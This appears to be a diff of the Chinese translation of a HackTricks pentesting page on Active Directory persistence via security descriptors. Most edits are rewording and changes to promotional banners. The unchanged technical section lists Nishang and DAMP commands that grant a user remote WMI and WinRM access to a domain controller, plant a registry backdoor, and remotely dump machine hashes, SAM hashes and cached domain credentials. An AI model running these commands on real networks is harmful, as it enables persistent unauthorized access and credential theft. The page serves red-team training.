@@ -2,45 +2,43 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>
+<summary><strong>从零开始学习AWS黑客攻击直至成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>
 
-- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+支持HackTricks的其他方式：
 
-- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-
-- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-
-- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-
-- **通过向[hacktricks仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud仓库](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。
+* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库**提交PR来分享您的黑客技巧**。
 
 </details>
 
 ## 安全描述符
 
-安全描述符定义语言（SDDL）定义了用于描述安全描述符的格式。SDDL使用ACE字符串来表示DACL和SACL：`ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`
+安全描述符定义语言（SDDL）定义了用于描述安全描述符的格式。SDDL使用ACE字符串表示DACL和SACL：`ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`
 
-**安全描述符**用于**存储**对象对**另一个对象**的**权限**。如果你可以**对对象的安全描述符**进行**小的更改**，你可以在不需要成为特权组成员的情况下获得对该对象的非常有趣的权限。
+**安全描述符**用于**存储**一个**对象**对**另一个对象**的**权限**。如果您能对一个对象的**安全描述符**进行**微小的更改**，您可以获得对该对象的非常有趣的权限，而无需成为特权组的成员。
 
-因此，这种持久化技术基于能够获得针对特定对象所需的每个权限，以便能够执行通常需要管理员权限的任务，但无需成为管理员。
+因此，这种持久化技术基于获得对某些对象的每一个所需权限的能力，以便能够执行通常需要管理员权限的任务，但无需成为管理员。
 
 ### 访问WMI
 
-你可以使用[**这个方法**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)为用户提供**远程执行WMI**的访问权限：
+您可以给予用户权限**远程执行WMI** [**使用这个**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)：
 ```bash
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
 ```
 ### 访问WinRM
 
-为用户提供对**winrm PS控制台的访问权限**[**使用此链接**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**：**
+授予用户访问**winrm PS控制台的权限**[**使用此方法**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**：**
 ```bash
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
 ```
 ### 远程访问哈希值
 
-访问**注册表**并**转储哈希值**，使用[**DAMP**](https://github.com/HarmJ0y/DAMP)创建**Reg后门**，这样你可以随时检索计算机的哈希值、**SAM**和计算机中的任何**缓存的AD凭据**。因此，将此权限授予**普通用户对域控制器计算机**非常有用：
+通过创建一个使用 [**DAMP**](https://github.com/HarmJ0y/DAMP) 的 **Reg 后门**，访问**注册表**并**转储哈希值**，这样你可以随时检索**计算机的哈希值**、**SAM** 以及计算机中任何**缓存的 AD** 凭据。因此，将这个权限授予**针对域控制器计算机的普通用户**非常有用：
 ```bash
 # allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
 Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose
@@ -54,20 +52,18 @@ Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose
 # Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
 Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
 ```
-查看[**Silver Tickets**](silver-ticket.md)以了解如何使用域控制器的计算机帐户的哈希值。
+查看[**Silver Tickets**](silver-ticket.md)学习如何使用域控制器计算机账户的哈希。
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>
 
-- 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
+其他支持HackTricks的方式：
 
-- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-
-- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-
-- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-
-- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。
+* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
